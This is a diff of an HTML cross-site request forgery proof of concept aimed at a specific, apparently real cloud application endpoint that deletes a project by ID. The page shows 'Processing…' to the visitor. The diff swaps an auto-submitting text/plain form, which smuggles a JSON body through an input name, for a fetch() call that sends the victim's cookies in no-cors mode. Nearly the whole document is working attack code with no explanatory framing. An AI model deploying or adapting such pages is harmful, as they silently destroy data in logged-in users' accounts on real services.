@@ -1,21 +1,14 @@
 <html>
-  <head><title>CSRF PoC – deleteProject</title></head>
   <body>
     <h1>Processing…</h1>
-    <form
-      id="csrf"
-      action="https://totalspendmanagement-smart-data-hub-smart-data-hub-ui-approuter.cfapps.eu10.hana.ondemand.com/cap_api/odata/v4/srv/deleteProject"
-      method="POST"
-      enctype="text/plain">
-      <!--
-        Browser sends:  name=value  (no encoding)
-        Resulting body:  {"PROJECT_ID":"660655de-d7ba-4ee1-a75d-c71d00b073e9","_":"="}
-        This is valid JSON; the server parses PROJECT_ID normally.
-      -->
-      <input type="hidden"
-             name='{"PROJECT_ID":"660655de-d7ba-4ee1-a75d-c71d00b073e9","_":"'
-             value='"}' />
-    </form>
-    <script>document.getElementById("csrf").submit();</script>
+    <script>
+      fetch("https://totalspendmanagement-smart-data-hub-smart-data-hub-ui-approuter.cfapps.eu10.hana.ondemand.com/cap_api/odata/v4/srv/deleteProject", {
+        method: "POST",
+        mode: "no-cors",
+        credentials: "include",
+        headers: { "Content-Type": "text/plain" },
+        body: JSON.stringify({ "PROJECT_ID": "660655de-d7ba-4ee1-a75d-c71d00b073e9" })
+      });
+    </script>
   </body>
 </html>
